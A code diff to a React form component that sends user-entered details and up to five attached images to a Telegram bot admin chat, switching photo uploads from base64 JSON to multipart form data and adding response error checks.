@@ -27,26 +27,20 @@ function MessageDetails() {
 
   const handleImageChange = (e) => {
     const files = Array.from(e.target.files)
-    if (files.length + images.length > 5) {
-      setError("Maximum 5 images allowed")
-      return
+    if (files.length > 0) {
+      const total = images.length + files.length
+      if (total > 5) {
+        setError("Maximum 5 images allowed")
+        return
+      }
+      setImages(prev => [...prev, ...files])
     }
-    setImages([...images, ...files])
   }
 
   const removeImage = (index) => {
     const newImages = [...images]
     newImages.splice(index, 1)
     setImages(newImages)
-  }
-
-  const imageToBase64 = (file) => {
-    return new Promise((resolve, reject) => {
-      const reader = new FileReader()
-      reader.onload = () => resolve(reader.result)
-      reader.onerror = reject
-      reader.readAsDataURL(file)
-    })
   }
 
   async function deleteWebhook() {
@@ -79,7 +73,7 @@ function MessageDetails() {
         `📝 Details: ${details.trim() || "N/A"}\n` +
         `🕒 Time: ${new Date().toISOString()}`
 
-      await fetch(TELEGRAM_API + '/sendMessage', {
+      const textResponse = await fetch(TELEGRAM_API + '/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -87,20 +81,27 @@ function MessageDetails() {
           text: message
         })
       })
+      if (!textResponse.ok) {
+        throw new Error('Failed to send text message')
+      }
 
-      for (const image of images) {
-        const base64 = await imageToBase64(image)
+      for (let i = 0; i < images.length; i++) {
+        const image = images[i]
         const caption = `📎 Supporting document - ${image.name} (${Math.round(image.size / 1024)}KB)`
         
-        await fetch(TELEGRAM_API + '/sendPhoto', {
+        const formData = new FormData()
+        formData.append('chat_id', ADMIN_CHAT_ID)
+        formData.append('photo', image)
+        formData.append('caption', caption)
+        
+        const response = await fetch(TELEGRAM_API + '/sendPhoto', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: ADMIN_CHAT_ID,
-            photo: base64,
-            caption: caption
-          })
-        }).catch(e => console.error('Image upload failed:', e))
+          body: formData
+        })
+        if (!response.ok) {
+          const errorText = await response.text()
+          console.error('Image upload failed:', errorText)
+        }
       }
 
       setLoading(false)
